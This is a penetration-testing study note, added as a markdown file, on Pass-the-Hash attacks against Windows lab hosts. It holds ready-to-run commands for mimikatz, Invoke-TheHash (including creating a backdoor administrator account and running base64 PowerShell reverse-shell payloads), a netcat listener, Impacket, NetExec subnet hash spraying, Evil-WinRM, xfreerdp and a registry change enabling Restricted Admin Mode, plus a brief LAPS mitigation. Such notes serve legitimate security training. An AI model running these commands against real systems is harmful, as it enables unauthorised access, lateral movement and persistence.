@@ -1,0 +1,433 @@
+# Password Attacks — Pass the Hash
+
+## Overview
+
+Pass the Hash (PtH) is an authentication technique where an attacker uses an **NTLM password hash** instead of the plaintext password.
+
+The attacker does **not** need to crack the password first.
+
+This works because NTLM authentication can accept the password hash directly during the challenge-response process.
+
+A PtH attack remains viable until the password is changed, because the hash stays the same across sessions.
+
+---
+
+# Requirements
+
+To perform PtH, we typically need a valid NTLM hash obtained from one of the following:
+
+- local **SAM** database
+- **NTDS.dit** from a Domain Controller
+- **LSASS** memory
+- cached credentials / credential dumping tools
+
+Common sources of NTLM hashes:
+
+- `secretsdump`
+- `mimikatz`
+- `pypykatz`
+- `netexec --sam`
+- `netexec --lsa`
+
+Example hash:
+
+```text
+64F12CDDAA88057E06A81B54E73B949B
+```
+
+Example account:
+
+```text
+julio@inlanefreight.htb
+```
+
+---
+
+# NTLM Quick Notes
+
+NTLM is Microsoft's legacy authentication protocol.
+
+Important points:
+
+- still widely present in Windows environments
+- often used for legacy compatibility
+- unsalted password hashes
+- vulnerable to Pass the Hash
+- Kerberos is default in AD, but NTLM is still common
+
+Because NTLM hashes are not salted, possessing the hash is often enough to authenticate.
+
+---
+
+# Windows PtH
+
+## Mimikatz
+
+Mimikatz can spawn a process in the context of a user using their NTLM hash.
+
+### Required parameters
+
+| Parameter | Meaning |
+|----------|---------|
+| `/user` | user to impersonate |
+| `/rc4` or `/ntlm` | NTLM hash |
+| `/domain` | domain or hostname |
+| `/run` | process to start |
+
+### Example
+
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+```
+
+This launches:
+
+```text
+cmd.exe
+```
+
+under the security context of:
+
+```text
+julio@inlanefreight.htb
+```
+
+---
+
+## Invoke-TheHash
+
+PowerShell toolkit for PtH over:
+
+- SMB
+- WMI
+
+Useful when you want remote command execution using a hash.
+
+### Import module
+
+```powershell
+Import-Module .\Invoke-TheHash.psd1
+```
+
+---
+
+### SMBExec Example
+
+```powershell
+Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+
+This:
+
+- authenticates with hash
+- creates a user
+- adds user to local Administrators
+
+---
+
+### WMIExec Example
+
+```powershell
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <BASE64_PAYLOAD>"
+```
+
+Useful for:
+
+- running PowerShell payloads
+- reverse shells
+- remote execution without plaintext password
+
+---
+
+## Netcat Listener Example
+
+```powershell
+.\nc.exe -lvnp 8001
+```
+
+Use together with a reverse shell payload when executing via WMI/SMB.
+
+---
+
+# Linux PtH
+
+## Impacket PsExec
+
+Classic PtH from Linux:
+
+```bash
+impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+### Other Impacket tools that support PtH
+
+```text
+impacket-psexec
+impacket-wmiexec
+impacket-atexec
+impacket-smbexec
+```
+
+---
+
+## NetExec
+
+Very useful for:
+
+- PtH spraying
+- local admin reuse checks
+- remote command execution
+
+### Single target
+
+```bash
+netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+### Subnet sweep
+
+```bash
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+If you see:
+
+```text
+(Pwn3d!)
+```
+
+it generally means the account has administrative rights on that target.
+
+---
+
+### Local admin reuse check
+
+```bash
+netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth
+```
+
+Useful when you dump a local Administrator hash from one machine and want to check for password reuse elsewhere.
+
+---
+
+### Remote command execution
+
+```bash
+netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+```
+
+---
+
+## Evil-WinRM
+
+Useful when:
+
+- WinRM is enabled
+- SMB is restricted
+- you want PowerShell access
+- hash auth is accepted
+
+### Example
+
+```bash
+evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+### Domain user format
+
+```bash
+evil-winrm -i 10.129.201.126 -u administrator@inlanefreight.htb -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+---
+
+## RDP with PtH
+
+GUI PtH is possible with `xfreerdp`.
+
+### Example
+
+```bash
+xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+```
+
+---
+
+# RDP PtH Caveats
+
+## Restricted Admin Mode
+
+RDP PtH usually requires **Restricted Admin Mode** to be enabled on the target.
+
+Enable with:
+
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+Without this, PtH over RDP may fail.
+
+---
+
+# UAC and Local Account Restrictions
+
+UAC limits remote administrative actions for local accounts.
+
+Important registry key:
+
+```text
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
+```
+
+### Behaviour
+
+| Value | Meaning |
+|------|---------|
+| `0` | only built-in RID 500 local Administrator can perform remote admin |
+| `1` | other local admins can also perform remote admin |
+
+---
+
+## FilterAdministratorToken
+
+Another relevant setting:
+
+```text
+FilterAdministratorToken
+```
+
+If enabled (`1`), even the built-in RID 500 Administrator is placed under UAC protections.
+
+This can break remote PtH with that account.
+
+---
+
+# Practical Use Cases
+
+Pass the Hash is especially useful for:
+
+- lateral movement
+- remote administration abuse
+- local admin password reuse
+- quickly testing access after dumping hashes
+- operating without cracking plaintext passwords first
+
+---
+
+# Common Workflow
+
+1. dump NTLM hash
+2. identify whether it is:
+   - local account
+   - domain account
+3. test authentication against:
+   - SMB
+   - WinRM
+   - WMI
+   - RDP
+4. confirm admin rights
+5. execute commands / pivot / escalate
+
+---
+
+# Quick Command Reference
+
+## Mimikatz
+
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" exit
+```
+
+## Invoke-TheHash SMB
+
+```powershell
+Invoke-SMBExec -Target <target> -Domain <domain> -Username <user> -Hash <hash> -Command "<command>" -Verbose
+```
+
+## Invoke-TheHash WMI
+
+```powershell
+Invoke-WMIExec -Target <target> -Domain <domain> -Username <user> -Hash <hash> -Command "<command>"
+```
+
+## Impacket PsExec
+
+```bash
+impacket-psexec <user>@<target> -hashes :<NTLM>
+```
+
+## Impacket WMIExec
+
+```bash
+impacket-wmiexec <user>@<target> -hashes :<NTLM>
+```
+
+## NetExec
+
+```bash
+netexec smb <target> -u <user> -d . -H <hash>
+```
+
+## NetExec command exec
+
+```bash
+netexec smb <target> -u <user> -d . -H <hash> -x whoami
+```
+
+## Evil-WinRM
+
+```bash
+evil-winrm -i <target> -u <user> -H <hash>
+```
+
+## xfreerdp
+
+```bash
+xfreerdp /v:<target> /u:<user> /pth:<hash>
+```
+
+---
+
+# Key Notes
+
+- PtH uses the **NTLM hash directly**
+- plaintext password is **not required**
+- works best against:
+  - SMB
+  - WMI
+  - WinRM
+  - sometimes RDP
+- local admin reuse is extremely valuable
+- LAPS mitigates local admin reuse
+- domain PtH is often more powerful than local PtH
+- UAC can break remote PtH for local accounts
+- Kerberos environments still often expose NTLM paths
+
+---
+
+# Good Defensive Recommendation
+
+If you see local admin hash reuse across multiple hosts, recommend:
+
+```text
+LAPS (Local Administrator Password Solution)
+```
+
+This randomises and rotates local administrator passwords, which sharply reduces PtH value across the subnet.
+
+---
+
+# Related Notes
+
+- Password Attacks — SAM, SYSTEM, and SECURITY
+- Password Attacks — Attacking LSASS
+- Password Attacks — Attacking Active Directory and NTDS.dit
+- Enumeration — WinRM
+- Enumeration — SMB
+- Lateral Movement
+
+---
+
+# Tags
+
+#password-attacks #pth #pass-the-hash #windows #ntlm #mimikatz #impacket #netexec #evil-winrm #xfreerdp #oscp
